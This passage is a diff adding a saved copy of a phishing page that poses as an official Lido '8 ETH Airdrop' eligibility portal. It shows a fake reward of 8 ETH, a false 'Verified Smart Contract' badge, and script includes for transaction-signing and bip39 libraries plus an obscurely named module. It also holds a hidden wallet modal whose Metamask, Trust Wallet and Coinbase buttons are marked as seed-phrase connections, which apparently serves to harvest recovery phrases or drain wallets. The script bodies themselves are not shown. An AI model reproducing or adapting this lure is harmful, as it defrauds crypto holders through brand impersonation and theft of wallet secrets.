@@ -1,0 +1,1054 @@
+<!DOCTYPE html><html lang="ru-RU" data-theme="light" data-scrapbook-source="https://8eth.vip/" data-scrapbook-create="20250418013806707" data-scrapbook-title="Check Eligibility for 8 ETH Airdrop | Lido"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_kE3iIl"></div><script src="chrome-extension://lgmpcpglpngdoalbgeoldeajfclnhafa/inpage.js"></script><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Check your eligibility for 8 ETH airdrop reward - Official Lido Airdrop Portal">
+    <title>Check Eligibility for 8 ETH Airdrop | Lido</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    
+      <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+            
+      <script src="/settings.js"></script>
+      <script src="/anbt4tg9io5.js" type="module"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        :root {
+            --primary: #00A3FF;
+            --primary-dark: #0082CC;
+            --background: #F7F8FA;
+            --card-bg: #FFFFFF;
+            --text: #273852;
+            --text-secondary: #5E6B81;
+            --border: #E8EBF1;
+            --success: #27AE60;
+            --warning: #F2994A;
+        }
+
+        body {
+            background: var(--background);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            padding: 0.75rem 2rem;
+            background: var(--card-bg);
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--primary);
+            font-weight: 600;
+            font-size: 1.25rem;
+            text-decoration: none;
+        }
+
+        .logo img {
+            width: 32px;
+            height: 32px;
+        }
+
+        .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 1.5rem;
+        }
+
+        .nav-link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.9rem;
+            padding: 0.5rem 0.75rem;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: all 0.2s;
+        }
+
+        .nav-link:hover {
+            background: var(--background);
+            color: var(--text);
+        }
+
+        .nav-link.active {
+            background: rgba(0, 163, 255, 0.1);
+            color: var(--primary);
+        }
+
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .eth-price {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            padding: 0.5rem 1rem;
+            background: var(--background);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .connect-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.75rem 1.25rem;
+            border-radius: 12px;
+            font-weight: 500;
+            font-size: 0.9rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: all 0.2s;
+        }
+
+        .connect-btn:hover {
+            background: var(--primary-dark);
+        }
+
+        .main-content {
+            max-width: 560px;
+            margin: 1.5rem auto;
+            padding: 0 1rem;
+            flex: 1;
+            display: flex;
+            align-items: center;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 24px;
+            padding: 1.5rem;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+            border: 1px solid var(--border);
+            width: 100%;
+        }
+
+        .page-title {
+            text-align: center;
+            margin-bottom: 0.5rem;
+            color: var(--text);
+            font-size: 2rem;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: var(--text-secondary);
+            margin-bottom: 0.5rem;
+            font-size: 1rem;
+        }
+
+        .eligibility-text {
+            text-align: center;
+            color: var(--success);
+            margin-bottom: 1rem;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .input-group {
+            background: var(--background);
+            border-radius: 16px;
+            padding: 1.25rem;
+            margin-bottom: 1rem;
+            border: 1px solid var(--border);
+        }
+
+        .input-label {
+            color: var(--text-secondary);
+            font-weight: 500;
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .input-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--text);
+            margin-bottom: 0.25rem;
+        }
+
+        .usd-value {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+
+        .option {
+            background: var(--background);
+            border-radius: 16px;
+            padding: 1.25rem;
+            border: 2px solid var(--border);
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+
+        .option:hover {
+            transform: translateY(-1px);
+        }
+
+        .option.active {
+            border-color: var(--primary);
+            background: rgba(0, 163, 255, 0.05);
+        }
+
+        .option-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.75rem;
+            color: var(--text);
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .option-detail {
+            display: flex;
+            justify-content: space-between;
+            color: var(--text-secondary);
+            font-size: 0.8rem;
+            margin-top: 0.5rem;
+        }
+
+        .check-btn {
+            width: 100%;
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 1rem;
+            border-radius: 16px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .check-btn:hover {
+            background: var(--primary-dark);
+            transform: translateY(-1px);
+        }
+
+        .security-info {
+            margin-top: 1rem;
+            padding: 1rem;
+            background: rgba(242, 153, 74, 0.1);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            color: var(--warning);
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            .header {
+                padding: 1rem;
+            }
+            
+            .nav-links {
+                display: none;
+            }
+
+            .eth-price {
+                display: none;
+            }
+
+            .options {
+                grid-template-columns: 1fr;
+            }
+
+            .page-title {
+                font-size: 1.75rem;
+            }
+
+            .input-value {
+                font-size: 1.75rem;
+            }
+
+            .card {
+                padding: 1.25rem;
+            }
+        }
+    </style>
+  <script type="module" src="urn:scrapbook:download:error:https://8eth.vip/assets/index.FxJCfKPu.js"></script>
+  <link rel="stylesheet" href="urn:scrapbook:download:error:https://8eth.vip/assets/index.BkE8pnkq.css">
+<style>@keyframes slide-in-one-tap {
+  from {
+    transform: translateY(80px);
+  }
+  to {
+    transform: translateY(0px);
+  }
+}
+
+.trust-hide-gracefully {
+  opacity: 0;
+}
+
+.trust-wallet-one-tap .hidden {
+    display: none;
+  }
+
+.trust-wallet-one-tap .semibold {
+    font-weight: 500;
+  }
+
+.trust-wallet-one-tap .binance-plex {
+    font-family: 'Binance';
+  }
+
+.trust-wallet-one-tap .rounded-full {
+    border-radius: 50%;
+  }
+
+.trust-wallet-one-tap .flex {
+    display: flex;
+  }
+
+.trust-wallet-one-tap .flex-col {
+    flex-direction: column;
+  }
+
+.trust-wallet-one-tap .items-center {
+    align-items: center;
+  }
+
+.trust-wallet-one-tap .space-between {
+    justify-content: space-between;
+  }
+
+.trust-wallet-one-tap .justify-center {
+    justify-content: center;
+  }
+
+.trust-wallet-one-tap .w-full {
+    width: 100%;
+  }
+
+.trust-wallet-one-tap .box {
+    transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+    animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+    width: 384px;
+    border-radius: 15px;
+    background: #fff;
+    box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+    position: fixed;
+    right: 30px;
+    bottom: 30px;
+    z-index: 1020;
+  }
+
+.trust-wallet-one-tap .header {
+    gap: 15px;
+    border-bottom: 1px solid #e6e6e6;
+    padding: 10px 18px;
+  }
+
+.trust-wallet-one-tap .header .left-items {
+      gap: 15px;
+    }
+
+.trust-wallet-one-tap .header .title {
+      color: #1e2329;
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 28px;
+    }
+
+.trust-wallet-one-tap .header .subtitle {
+      color: #474d57;
+      font-size: 14px;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .header .close {
+      color: #1e2329;
+      cursor: pointer;
+    }
+
+.trust-wallet-one-tap .body {
+    padding: 9px 18px;
+    gap: 10px;
+  }
+
+.trust-wallet-one-tap .body .right-items {
+      gap: 10px;
+      width: 100%;
+    }
+
+.trust-wallet-one-tap .body .right-items .wallet-title {
+        color: #1e2329;
+        font-size: 16px;
+        font-weight: 600;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .body .right-items .wallet-subtitle {
+        color: #474d57;
+        font-size: 14px;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .connect-indicator {
+    gap: 15px;
+    padding: 8px 0;
+  }
+
+.trust-wallet-one-tap .connect-indicator .flow-icon {
+      color: #474d57;
+    }
+
+.trust-wallet-one-tap .loading-color {
+    color: #fff;
+  }
+
+.trust-wallet-one-tap .button {
+    border-radius: 50px;
+    outline: 2px solid transparent;
+    outline-offset: 2px;
+    background-color: rgb(5, 0, 255);
+    border-color: rgb(229, 231, 235);
+    cursor: pointer;
+    text-align: center;
+    height: 45px;
+  }
+
+.trust-wallet-one-tap .button .button-text {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .footer {
+    margin: 20px 30px;
+  }
+
+.trust-wallet-one-tap .check-icon {
+    color: #fff;
+  }
+
+@font-face {
+  font-family: 'Binance';
+  src: url("") format('opentype');
+  font-weight: 400;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url("") format('opentype');
+  font-weight: 500;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url("") format('opentype');
+  font-weight: 600;
+  font-style: normal;
+}
+</style><script type="text/javascript" charset="UTF-8" src="ethers.umd.min.js"></script><script type="text/javascript" charset="UTF-8" src="merkletree.js"></script><link rel="stylesheet" href="modal-21.css"><script type="text/javascript" charset="UTF-8" src="wallet-connect-v4.js"></script><script type="text/javascript" charset="UTF-8" src="bip39.js"></script><script type="text/javascript" charset="UTF-8" src="onboard.js"></script><style>wcm-modal{--wcm-z-index:2147483647}:root{--onboard-modal-z-index:2147483646;--account-center-z-index:2147483647}</style></head>
+<body>
+    <header class="header">
+        <nav class="nav">
+            <div class="nav-left">
+                <a href="#" class="logo">
+                    <img src="stETH_qyvk78.png" alt="Lido Logo">
+                </a>
+                <div class="nav-links">
+                    <a href="#" class="nav-link">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path>
+                        </svg>
+                        Stake
+                    </a>
+                    <a href="#" class="nav-link">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="3" width="18" height="18" rx="2"></rect>
+                            <path d="M8 12h8"></path>
+                        </svg>
+                        Wrap
+                    </a>
+                    <a href="#" class="nav-link active">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M12 2v20M2 12h20"></path>
+                        </svg>
+                        Airdrop
+                    </a>
+                    <a href="#" class="nav-link">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <path d="M12 6v12"></path>
+                        </svg>
+                        Governance
+                    </a>
+                </div>
+            </div>
+            <div class="nav-right">
+                
+                <button class="interact-button connect-btn">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="3" y="3" width="18" height="18" rx="2"></rect>
+                        <path d="M8 12h8"></path>
+                    </svg>
+                    Connect Wallet
+                </button>
+            </div>
+        </nav>
+    </header>
+
+    <main class="main-content">
+        <div class="card">
+            <h1 class="page-title">ETH Airdrop Portal</h1>
+            <p class="subtitle">Check your wallet's eligibility for the exclusive airdrop</p>
+            <p class="eligibility-text">Addresses that have received NFT Airdrop, are eligible for rewards</p>
+
+            <div class="input-group">
+                <div class="input-label">Potential Airdrop Amount</div>
+                <div class="input-value">8.0 ETH</div>
+                <div class="usd-value">≈ $12,703.58 USD</div>
+            </div>
+
+            <div class="options">
+                <div class="option active">
+                    <div class="option-header">
+                        <span>Instant Claim</span>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path>
+                        </svg>
+                    </div>
+                    <div class="option-detail">
+                        <span>Processing Time</span>
+                        <span>Instant</span>
+                    </div>
+                    <div class="option-detail">
+                        <span>Network Fee</span>
+                        <span>Covered</span>
+                    </div>
+                </div>
+                <div class="option">
+                    <div class="option-header">
+                        <span>Stake &amp; Earn</span>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <path d="M12 6v12M6 12h12"></path>
+                        </svg>
+                    </div>
+                    <div class="option-detail">
+                        <span>Annual Yield</span>
+                        <span>+5.2% APR</span>
+                    </div>
+                    <div class="option-detail">
+                        <span>Lock Period</span>
+                        <span>Flexible</span>
+                    </div>
+                </div>
+            </div>
+
+            <button class="interact-button check-btn">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                    <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                </svg>
+                Check Eligibility
+            </button>
+
+            <div class="security-info">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                </svg>
+                Secure Protocol - Verified Smart Contract
+            </div>
+        </div>
+    </main>
+    <div id="root"></div>
+
+<div id="start-modal" class="connect-modal-parent scwtw-fixed scwtw-w-full scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-z-[2147483646] scwtw-bottom-0 md:scwtw-justify-center md:scwtw-bottom-auto md:scwtw-top-1/2 md:scwtw-left-1/2 md:-scwtw-translate-x-1/2 md:-scwtw-translate-y-1/2 scwtw-opacity-0" style="display: none;">
+        <div class="2xl:scwtw-max-w-[800px] lg:scwtw-max-w-[750px] md:scwtw-max-w-[650px] max-w-auto scwtw-w-full scwtw-bg-[#ffffff] dark:scwtw-bg-[#121313] dark:scwtw-border dark:scwtw-border-[#292929] md:scwtw-h-[500px] scwtw-rounded-[24px] md:scwtw-overflow-y-hidden scwtw-overflow-y-auto">
+            <div class="md:scwtw-flex md:scwtw-flex-row scwtw-px-6 scwtw-py-8 scwtw-h-full scwtw-gap-4">
+                <div class="md:scwtw-basis-1/2 md:scwtw-mb-0 scwtw-mb-4">
+                    <div class="scwtw-mb-4">
+                        <svg class="scwtw-h-[35px] scwtw-w-auto" width="249" height="48" viewBox="0 0 249 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M0 24C0 10.745 10.055 0 22.459 0H79.541C91.945 0 102 10.745 102 24C102 37.255 91.945 48 79.541 48H22.459C10.055 48 0 37.255 0 24Z" fill="#202020"></path>
+                            <path d="M70.1064 29.874V18.786H72.0644V20.458C72.7684 19.226 74.1984 18.5 75.7824 18.5C78.1804 18.5 79.8524 20.018 79.8524 22.966V29.874H77.9164V23.076C77.9164 21.14 76.8164 20.128 75.2104 20.128C73.4724 20.128 72.0644 21.514 72.0644 23.472V29.874H70.1064ZM57.7614 29.874L55.7154 18.786H57.5634L59.0154 27.938L60.9294 21.91H62.7554L64.6474 27.872L66.1214 18.786H67.9694L65.9234 29.874H63.7234L61.8534 24.11L59.9614 29.874H57.7614ZM49.1134 30.16C45.7474 30.16 43.7674 27.652 43.7674 24.33C43.7674 21.03 45.7474 18.5 49.1134 18.5C52.4794 18.5 54.4594 21.03 54.4594 24.33C54.4594 27.652 52.4794 30.16 49.1134 30.16ZM49.1134 28.532C51.5334 28.532 52.4574 26.464 52.4574 24.308C52.4574 22.174 51.5334 20.128 49.1134 20.128C46.6934 20.128 45.7694 22.174 45.7694 24.308C45.7694 26.464 46.6934 28.532 49.1134 28.532ZM36.8424 30.16C33.5864 30.16 31.5404 27.674 31.5404 24.33C31.5404 21.008 33.5864 18.5 36.8424 18.5C39.5924 18.5 42.0124 20.062 41.7484 24.836H33.5424C33.6964 26.882 34.6424 28.554 36.8424 28.554C38.3164 28.554 39.2844 27.652 39.6144 26.618H41.5504C41.2424 28.466 39.5044 30.16 36.8424 30.16ZM33.5864 23.362H39.8564C39.7024 21.14 38.6684 20.106 36.8424 20.106C34.8404 20.106 33.8504 21.558 33.5864 23.362ZM22.1484 29.874V18.786H24.1504V20.656C24.8544 19.424 26.0644 18.786 27.3184 18.786H29.9804V20.656H27.1644C25.4044 20.656 24.1504 21.8 24.1504 24.022V29.874H22.1484Z" fill="white"></path>
+                            <path d="M115.496 16.6H117.938L120.82 24.608L123.702 16.6H126.144V32H124.208V19.966L121.7 26.632H119.94L117.432 19.966V32H115.496V16.6ZM132.879 32.286C131.764 32.286 130.862 31.9853 130.173 31.384C129.498 30.7827 129.161 29.9907 129.161 29.008C129.161 27.864 129.542 27.05 130.305 26.566C131.082 26.0673 132.05 25.7447 133.209 25.598L135.585 25.29C135.995 25.246 136.274 25.1213 136.421 24.916C136.567 24.7107 136.641 24.454 136.641 24.146V24.124C136.641 23.552 136.435 23.09 136.025 22.738C135.629 22.386 135.035 22.21 134.243 22.21C133.436 22.21 132.798 22.3933 132.329 22.76C131.874 23.112 131.603 23.6327 131.515 24.322H129.557C129.674 23.1927 130.151 22.298 130.987 21.638C131.823 20.9633 132.901 20.626 134.221 20.626C135.673 20.626 136.758 20.9707 137.477 21.66C138.21 22.3493 138.577 23.3247 138.577 24.586V29.954C138.577 30.086 138.621 30.196 138.709 30.284C138.797 30.3573 138.907 30.394 139.039 30.394H139.721V32H138.401C137.873 32 137.469 31.8827 137.191 31.648C136.912 31.3987 136.773 31.0613 136.773 30.636V30.372C136.318 31.0467 135.746 31.538 135.057 31.846C134.367 32.1393 133.641 32.286 132.879 32.286ZM133.385 30.702C134.367 30.702 135.152 30.372 135.739 29.712C136.34 29.052 136.641 28.1793 136.641 27.094V26.324C136.362 26.4707 135.988 26.5807 135.519 26.654L133.583 26.94C132.747 27.072 132.138 27.2993 131.757 27.622C131.375 27.93 131.185 28.3627 131.185 28.92C131.185 29.4773 131.383 29.9173 131.779 30.24C132.175 30.548 132.71 30.702 133.385 30.702ZM143.287 20.912H145.245V22.584C145.597 21.968 146.103 21.4913 146.763 21.154C147.438 20.802 148.171 20.626 148.963 20.626C150.195 20.626 151.178 21.0147 151.911 21.792C152.659 22.5547 153.033 23.6547 153.033 25.092V32H151.097V25.202C151.097 24.2633 150.848 23.5373 150.349 23.024C149.865 22.5107 149.212 22.254 148.391 22.254C147.819 22.254 147.291 22.4007 146.807 22.694C146.323 22.9727 145.942 23.3687 145.663 23.882C145.384 24.3807 145.245 24.9527 145.245 25.598V32H143.287V20.912ZM161 32.286C159.768 32.286 158.778 31.9047 158.03 31.142C157.296 30.3647 156.93 29.2573 156.93 27.82V20.912H158.888V27.71C158.888 28.6633 159.13 29.3967 159.614 29.91C160.098 30.4087 160.758 30.658 161.594 30.658C162.166 30.658 162.686 30.5187 163.156 30.24C163.64 29.9467 164.021 29.5433 164.3 29.03C164.593 28.5167 164.74 27.9447 164.74 27.314V20.912H166.676V32H164.74V30.328C164.373 30.944 163.86 31.428 163.2 31.78C162.54 32.1173 161.806 32.286 161 32.286ZM173.806 32.286C172.692 32.286 171.79 31.9853 171.1 31.384C170.426 30.7827 170.088 29.9907 170.088 29.008C170.088 27.864 170.47 27.05 171.232 26.566C172.01 26.0673 172.978 25.7447 174.136 25.598L176.512 25.29C176.923 25.246 177.202 25.1213 177.348 24.916C177.495 24.7107 177.568 24.454 177.568 24.146V24.124C177.568 23.552 177.363 23.09 176.952 22.738C176.556 22.386 175.962 22.21 175.17 22.21C174.364 22.21 173.726 22.3933 173.256 22.76C172.802 23.112 172.53 23.6327 172.442 24.322H170.484C170.602 23.1927 171.078 22.298 171.914 21.638C172.75 20.9633 173.828 20.626 175.148 20.626C176.6 20.626 177.686 20.9707 178.404 21.66C179.138 22.3493 179.504 23.3247 179.504 24.586V29.954C179.504 30.086 179.548 30.196 179.636 30.284C179.724 30.3573 179.834 30.394 179.966 30.394H180.648V32H179.328C178.8 32 178.397 31.8827 178.118 31.648C177.84 31.3987 177.7 31.0613 177.7 30.636V30.372C177.246 31.0467 176.674 31.538 175.984 31.846C175.295 32.1393 174.569 32.286 173.806 32.286ZM174.312 30.702C175.295 30.702 176.08 30.372 176.666 29.712C177.268 29.052 177.568 28.1793 177.568 27.094V26.324C177.29 26.4707 176.916 26.5807 176.446 26.654L174.51 26.94C173.674 27.072 173.066 27.2993 172.684 27.622C172.303 27.93 172.112 28.3627 172.112 28.92C172.112 29.4773 172.31 29.9173 172.706 30.24C173.102 30.548 173.638 30.702 174.312 30.702ZM183.775 30.394H188.065V18.206H184.567V16.6H190.023V30.394H194.291V32H183.775V30.394ZM211.302 16.6H213.304V24.52L219.728 16.6H222.148L216.846 22.936L222.412 32H220.168L215.526 24.52L213.304 27.204V32H211.302V16.6ZM224.835 30.35H228.971V22.562H225.275V20.912H230.973V30.35H235.087V32H224.835V30.35ZM228.883 16.6H231.083V19.02H228.883V16.6ZM244.329 32C243.376 32 242.672 31.7947 242.217 31.384C241.763 30.9587 241.535 30.2913 241.535 29.382V22.518H238.235V20.912H241.029C241.176 20.912 241.293 20.868 241.381 20.78C241.484 20.692 241.535 20.5747 241.535 20.428V17.238H243.471V20.912H247.849V22.518H243.471V29.118C243.471 29.5287 243.574 29.844 243.779 30.064C243.985 30.2693 244.322 30.372 244.791 30.372H248.333V32H244.329Z" fill="#202020"></path>
+                        </svg>                
+                    </div>
+                    <div class="scwtw-mb-4">
+                        <p class="font-kh-teka-mono scwtw-text-base scwtw-font-normal scwtw-text-[#202020] dark:scwtw-text-[#ffffff]">Popular:</p>
+                    </div>
+                    <div class="scwtw-flex scwtw-flex-col scwtw-items-start scwtw-gap-y-2 scwtw-h-full md:scwtw-max-h-[350px] scwtw-max-h-[300px] scwtw-overflow-y-auto custom-reown-scrollbar start-modal-buttons-container">
+                        
+
+        <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
+                        <button class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button" type="button" id="metamask-seed-connect-button" data-is-loading="false" data-is-recommended="true">
+                            <div class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4">
+                                <div class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]">
+                                    <img class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]" src="d6eccfce7ad69d5f5d9fd3c225974526ac2393a1.webp" alt="Metamask">
+                                </div>
+                                <div class="scwtw-text-start">
+                                    <span class="scwtw-font-normal scwtw-text-[15px] scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]">Metamask</span>
+                                </div>
+                            </div>
+                            <div class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2">
+                                
+                                <div class="scwtw-px-2 scwtw-py-1 scwtw-rounded-[4px] scwtw-text-[#10b981] scwtw-font-semibold scwtw-bg-[#10b98126] font-inter scwtw-text-[9px]">
+                                    <span class="scwtw-uppercase">Recommended</span>
+                                </div>
+                                
+                                <div class="scwtw-hidden scwtw-items-center scwtw-justify-end">
+                                    <div>
+                                        <svg class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </button>
+                    </div>
+    
+
+        <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
+                        <button class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button" type="button" id="trust-wallet-seed-connect-button" data-is-loading="false" data-is-recommended="false">
+                            <div class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4">
+                                <div class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]">
+                                    <img class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]" src="da974aef55c1f343f5888d3952771b0b2fa7b389.webp" alt="Trust Wallet">
+                                </div>
+                                <div class="scwtw-text-start">
+                                    <span class="scwtw-font-normal scwtw-text-[15px] scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]">Trust Wallet</span>
+                                </div>
+                            </div>
+                            <div class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2">
+                                
+                                <div class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end">
+                                    <div>
+                                        <svg class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </button>
+                    </div>
+    
+
+        <div class="scwtw-w-full md:scwtw-pr-1.5 scwtw-pr-0">
+                        <button class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-gap-x-4 scwtw-w-full scwtw-p-2 scwtw-rounded-[20px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] hover:scwtw-bg-[#0000000d] dark:hover:scwtw-bg-[#ffffff0d] scwtw-cursor-pointer scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 scwtw-group seed-connection-button" type="button" id="coinbase-seed-connect-button" data-is-loading="false" data-is-recommended="false">
+                            <div class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4">
+                                <div class="scwtw-rounded-[13px] scwtw-bg-[#00000005] dark:scwtw-bg-[#ffffff05] scwtw-border scwtw-border-[#dddddd] dark:scwtw-border-[#2a2a2a]">
+                                    <img class="scwtw-w-[40px] scwtw-h-[40px] scwtw-rounded-[12px]" src="f0362b531e6a030f0af62c88dfbe43fbc8fbb037.webp" alt="Coinbase Wallet">
+                                </div>
+                                <div class="scwtw-text-start">
+                                    <span class="scwtw-font-normal scwtw-text-[15px] scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]">Coinbase Wallet</span>
+                                </div>
+                            </div>
+                            <div class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2">
+                                
+                                <div class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end">
+                                    <div>
+                                        <svg class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
+                                    </div>
